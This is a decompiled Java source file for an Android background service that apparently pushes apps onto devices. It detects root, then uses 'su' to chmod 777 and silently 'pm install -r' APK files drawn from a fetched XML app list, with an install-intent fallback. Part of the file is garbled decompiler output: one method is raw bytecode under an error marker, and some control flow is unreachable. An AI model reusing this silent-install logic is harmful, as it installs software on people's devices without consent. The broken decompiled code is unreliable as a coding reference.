package com.yongrun.app.sxmn.service;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;

public class Service_BindApp
  extends Service
{
  private String[] a;
  private String b;
  
  public Service_BindApp() {}
  
  public void a(File paramFile)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
    localIntent.setFlags(268435456);
    startActivity(localIntent);
  }
  
  public boolean a()
  {
    try
    {
      if (!new File("/system/bin/su").exists())
      {
        boolean bool = new File("/system/xbin/su").exists();
        if (!bool) {
          return false;
        }
      }
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public boolean a(File paramFile, boolean paramBoolean)
  {
    paramBoolean = true;
    System.out.println(paramFile.getPath());
    System.out.println(paramFile.getPath() + "==");
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      OutputStream localOutputStream = localProcess.getOutputStream();
      DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
      localDataOutputStream.writeBytes("chmod 777 " + paramFile.getPath() + "\n");
      localDataOutputStream.writeBytes("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install -r " + paramFile.getPath());
      localDataOutputStream.flush();
      localDataOutputStream.close();
      localOutputStream.close();
      int i = localProcess.waitFor();
      if (i == 0) {}
      for (;;)
      {
        if (!paramBoolean) {
          a(paramFile);
        }
        return paramBoolean;
        if (i == 1) {
          paramBoolean = false;
        } else {
          paramBoolean = false;
        }
      }
      return false;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      a(paramFile);
    }
  }
  
  public boolean a(String paramString)
  {
    List localList = getPackageManager().getInstalledPackages(0);
    ArrayList localArrayList = new ArrayList();
    int i;
    if (localList != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localList.size()) {
        return localArrayList.contains(paramString);
      }
      localArrayList.add(((PackageInfo)localList.get(i)).packageName);
      i += 1;
    }
  }
  
  /* Error */
  public List<com.yongrun.app.sxmn.c.a> b()
  {
    // Byte code:
    //   0: new 180	com/yongrun/app/sxmn/a
    //   3: dup
    //   4: invokespecial 181	com/yongrun/app/sxmn/a:<init>	()V
    //   7: astore_2
    //   8: new 155	java/util/ArrayList
    //   11: dup
    //   12: invokespecial 156	java/util/ArrayList:<init>	()V
    //   15: astore_3
    //   16: aload_0
    //   17: ldc -73
    //   19: iconst_0
    //   20: invokevirtual 187	com/yongrun/app/sxmn/service/Service_BindApp:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   23: astore 4
    //   25: aload 4
    //   27: ldc -67
    //   29: ldc -65
    //   31: invokeinterface 197 3 0
    //   36: astore 5
    //   38: invokestatic 202	com/yongrun/app/sxmn/common/b:a	()Lcom/yongrun/app/sxmn/common/b;
    //   41: new 76	java/lang/StringBuilder
    //   44: dup
    //   45: ldc -52
    //   47: invokespecial 83	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   50: aload 5
    //   52: invokevirtual 89	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   55: invokevirtual 92	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   58: invokevirtual 207	com/yongrun/app/sxmn/common/b:a	(Ljava/lang/String;)Ljava/lang/String;
    //   61: astore 5
    //   63: aload 5
    //   65: ifnull +226 -> 291
    //   68: new 209	org/xml/sax/InputSource
    //   71: dup
    //   72: new 211	java/io/StringReader
    //   75: dup
    //   76: aload 5
    //   78: invokespecial 212	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   81: invokespecial 215	org/xml/sax/InputSource:<init>	(Ljava/io/Reader;)V
    //   84: pop
    //   85: invokestatic 221	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   88: invokevirtual 225	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   91: new 227	java/io/ByteArrayInputStream
    //   94: dup
    //   95: aload 5
    //   97: invokevirtual 231	java/lang/String:getBytes	()[B
    //   100: invokespecial 234	java/io/ByteArrayInputStream:<init>	([B)V
    //   103: invokevirtual 240	javax/xml/parsers/DocumentBuilder:parse	(Ljava/io/InputStream;)Lorg/w3c/dom/Document;
    //   106: astore 5
    //   108: aload 5
    //   110: ldc -14
    //   112: invokeinterface 248 2 0
    //   117: astore 6
    //   119: iconst_0
    //   120: istore_1
    //   121: iload_1
    //   122: aload 6
    //   124: invokeinterface 253 1 0
    //   129: if_icmplt +168 -> 297
    //   132: aload 5
    //   134: ldc -1
    //   136: invokeinterface 248 2 0
    //   141: astore 6
    //   143: aload 6
    //   145: ifnull +146 -> 291
    //   148: aload 6
    //   150: invokeinterface 253 1 0
    //   155: ifle +136 -> 291
    //   158: aload 6
    //   160: iconst_0
    //   161: invokeinterface 259 2 0
    //   166: checkcast 261	org/w3c/dom/Element
    //   169: ldc_w 263
    //   172: invokeinterface 264 2 0
    //   177: iconst_0
    //   178: invokeinterface 259 2 0
    //   183: invokeinterface 270 1 0
    //   188: invokeinterface 273 1 0
    //   193: astore 5
    //   195: aload_0
    //   196: aload 5
    //   198: ldc_w 275
    //   201: invokevirtual 279	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   204: putfield 16	com/yongrun/app/sxmn/service/Service_BindApp:a	[Ljava/lang/String;
    //   207: aload_0
    //   208: aload 6
    //   210: iconst_0
    //   211: invokeinterface 259 2 0
    //   216: checkcast 261	org/w3c/dom/Element
    //   219: ldc_w 281
    //   222: invokeinterface 264 2 0
    //   227: iconst_0
    //   228: invokeinterface 259 2 0
    //   233: invokeinterface 270 1 0
    //   238: invokeinterface 273 1 0
    //   243: putfield 283	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   246: aload 4
    //   248: invokeinterface 287 1 0
    //   253: astore 4
    //   255: aload 4
    //   257: ldc_w 289
    //   260: aload 5
    //   262: invokeinterface 295 3 0
    //   267: pop
    //   268: aload 4
    //   270: ldc_w 297
    //   273: aload_0
    //   274: getfield 283	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   277: invokeinterface 295 3 0
    //   282: pop
    //   283: aload 4
    //   285: invokeinterface 300 1 0
    //   290: pop
    //   291: aload_2
    //   292: invokevirtual 302	com/yongrun/app/sxmn/a:a	()V
    //   295: aload_3
    //   296: areturn
    //   297: aload 6
    //   299: iload_1
    //   300: invokeinterface 259 2 0
    //   305: checkcast 261	org/w3c/dom/Element
    //   308: ldc_w 304
    //   311: invokeinterface 264 2 0
    //   316: iconst_0
    //   317: invokeinterface 259 2 0
    //   322: invokeinterface 270 1 0
    //   327: invokeinterface 273 1 0
    //   332: astore 7
    //   334: aload 6
    //   336: iload_1
    //   337: invokeinterface 259 2 0
    //   342: checkcast 261	org/w3c/dom/Element
    //   345: ldc_w 306
    //   348: invokeinterface 264 2 0
    //   353: iconst_0
    //   354: invokeinterface 259 2 0
    //   359: invokeinterface 270 1 0
    //   364: invokeinterface 273 1 0
    //   369: astore 8
    //   371: aload 6
    //   373: iload_1
    //   374: invokeinterface 259 2 0
    //   379: checkcast 261	org/w3c/dom/Element
    //   382: ldc_w 308
    //   385: invokeinterface 264 2 0
    //   390: iconst_0
    //   391: invokeinterface 259 2 0
    //   396: invokeinterface 270 1 0
    //   401: invokeinterface 273 1 0
    //   406: astore 9
    //   408: aload 6
    //   410: iload_1
    //   411: invokeinterface 259 2 0
    //   416: checkcast 261	org/w3c/dom/Element
    //   419: ldc_w 310
    //   422: invokeinterface 264 2 0
    //   427: iconst_0
    //   428: invokeinterface 259 2 0
    //   433: invokeinterface 270 1 0
    //   438: invokeinterface 273 1 0
    //   443: astore 10
    //   445: aload 6
    //   447: iload_1
    //   448: invokeinterface 259 2 0
    //   453: checkcast 261	org/w3c/dom/Element
    //   456: ldc_w 312
    //   459: invokeinterface 264 2 0
    //   464: iconst_0
    //   465: invokeinterface 259 2 0
    //   470: invokeinterface 270 1 0
    //   475: invokeinterface 273 1 0
    //   480: astore 11
    //   482: new 314	com/yongrun/app/sxmn/c/a
    //   485: dup
    //   486: invokespecial 315	com/yongrun/app/sxmn/c/a:<init>	()V
    //   489: astore 12
    //   491: aload 12
    //   493: aload 8
    //   495: invokevirtual 318	com/yongrun/app/sxmn/c/a:d	(Ljava/lang/String;)V
    //   498: aload 12
    //   500: aload 7
    //   502: invokevirtual 320	com/yongrun/app/sxmn/c/a:a	(Ljava/lang/String;)V
    //   505: aload 12
    //   507: aload 9
    //   509: invokevirtual 323	com/yongrun/app/sxmn/c/a:c	(Ljava/lang/String;)V
    //   512: aload 12
    //   514: aload 11
    //   516: invokevirtual 325	com/yongrun/app/sxmn/c/a:b	(Ljava/lang/String;)V
    //   519: aload 12
    //   521: aload 10
    //   523: invokevirtual 328	com/yongrun/app/sxmn/c/a:e	(Ljava/lang/String;)V
    //   526: aload_3
    //   527: aload 12
    //   529: invokeinterface 177 2 0
    //   534: pop
    //   535: iload_1
    //   536: iconst_1
    //   537: iadd
    //   538: istore_1
    //   539: goto -418 -> 121
    //   542: astore_3
    //   543: new 155	java/util/ArrayList
    //   546: dup
    //   547: invokespecial 156	java/util/ArrayList:<init>	()V
    //   550: astore 4
    //   552: aload_3
    //   553: invokevirtual 142	java/lang/Exception:printStackTrace	()V
    //   556: aload_2
    //   557: invokevirtual 302	com/yongrun/app/sxmn/a:a	()V
    //   560: aload 4
    //   562: areturn
    //   563: astore_3
    //   564: aload_2
    //   565: invokevirtual 302	com/yongrun/app/sxmn/a:a	()V
    //   568: aload_3
    //   569: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	570	0	this	Service_BindApp
    //   120	419	1	i	int
    //   7	558	2	localA	com.yongrun.app.sxmn.a
    //   15	512	3	localArrayList	ArrayList
    //   542	11	3	localException	Exception
    //   563	6	3	localObject1	Object
    //   23	538	4	localObject2	Object
    //   36	225	5	localObject3	Object
    //   117	329	6	localNodeList	org.w3c.dom.NodeList
    //   332	169	7	str1	String
    //   369	125	8	str2	String
    //   406	102	9	str3	String
    //   443	79	10	str4	String
    //   480	35	11	str5	String
    //   489	39	12	localA1	com.yongrun.app.sxmn.c.a
    // Exception table:
    //   from	to	target	type
    //   16	63	542	java/lang/Exception
    //   68	119	542	java/lang/Exception
    //   121	143	542	java/lang/Exception
    //   148	291	542	java/lang/Exception
    //   297	535	542	java/lang/Exception
    //   16	63	563	finally
    //   68	119	563	finally
    //   121	143	563	finally
    //   148	291	563	finally
    //   297	535	563	finally
    //   543	556	563	finally
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    new Thread(new a(this, com.yongrun.app.sxmn.common.a.a())).start();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
